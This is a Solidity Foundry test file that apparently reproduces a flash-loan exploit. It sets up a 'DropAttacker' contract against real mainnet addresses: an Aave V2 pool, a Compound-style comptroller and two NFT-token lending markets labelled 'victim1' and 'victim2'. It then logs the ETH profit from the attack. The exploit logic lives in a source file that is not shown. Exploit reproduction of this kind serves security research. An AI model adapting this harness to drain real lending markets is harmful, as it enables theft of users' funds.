// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/IPoolV2.sol";
import "../src/IFlashLoanReceiver.sol";
import "../src/IERC20.sol";
import "../src/IUniswapV2Router.sol";
// import "../src/IUniswapV2Pair.sol";
import "../src/IUnitroller.sol";
import "../src/ICerc20.sol";
import "../src/Swap.sol";
import "../src/DropAttacker.sol";

// interface INFTI is IERC20 {
//     function mint(uint256 amount) external;
//     function burn(uint256 amount) external;
// }

contract CounterTest is Test{

    DropAttacker private bot;

    // Addresses
    address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; //Main
    address public WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;//Main 
    // address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;//Main
    address public USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //Main
    // address public OPEN = 0x69e8b9528CABDA89fe846C67675B5D73d463a916;//Main
    address public NFTI = 0x525eF76138Bf76118d786DbedeaE5F87aaBf4a81;

    // address public MEEB = 0x641927E970222B10b2E8CDBC96b1B4F427316f16;
    address public xMEEB = 0x11Df658567e615f69D23289BE8A27a9C260cE297;
    address public xPUNK = 0x08765C76C758Da951DC73D3a8863B34752Dd76FB;
    address public kERC20_1 = 0x8486B523a32e9D0d021078Fe68a3b98fC765FbaB;//Main xMeeb
    address public kERC20_2 = 0xfBA58fDDB88203E1D32D0F3E6DbFD9d8b505EC18;//Main xPunk
    // address public kERC20_3 = 0x0Fc825B3c2333eAAf277cED5CA239EDa82913be5;//Main uni
    address public UNITROLLER = 0xB70FB69a522ed8D4613C4C720F91F93a836EE2f5;//Main




    // address public UNIPAIR = 0xe339c1D0A744053CbCeb0D2dc2d13967c8a69586;//Main token0 Meetb token1 WETH
    // address public NFTx = 0x3E135c3E981fAe3383A5aE0d323860a34CfAB893;//Main
    address public AAVE_POOLV2 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;//Main  
    ILendingPool flashPool = ILendingPool(AAVE_POOLV2);// AAVE pool V2
    // IUniswapV2Pair uniPair = IUniswapV2Pair(UNIPAIR);
    // INFTx nftx = INFTx(NFTx);
    CErc20Interface victim2 = CErc20Interface(kERC20_2);
    CErc20Interface victim1 = CErc20Interface(kERC20_1);

    // IERC20 dai = IERC20(DAI);
    IERC20 xpunk = IERC20(xPUNK);
    // IERC20 meeb = IERC20(MEEB);
    IERC20 xmeeb = IERC20(xMEEB);

    ComptrollerInterface unitroller = ComptrollerInterface(UNITROLLER);
    INFTI nfti = INFTI(NFTI);

    
    function setUp() public {
        bot = new DropAttacker();
    
    }

    function testTrade1() public {
        
        uint256 amount0 = payable(address(this)).balance;
        bot.getFlashloan(100e18);
        uint256 amount1 = payable(address(this)).balance;
        console.log("ETH plus :",amount1-amount0);
    }



      function balanceOfThis(address _erc20TokenAddress) internal view returns (uint256 bal) {
        IERC20 ERC20Token;    
        ERC20Token = IERC20(_erc20TokenAddress);
   
        bal = ERC20Token.balanceOf(address(this));
        console.log("Executor Token balance", bal);
        return bal;   

    }

    receive()external payable {}

}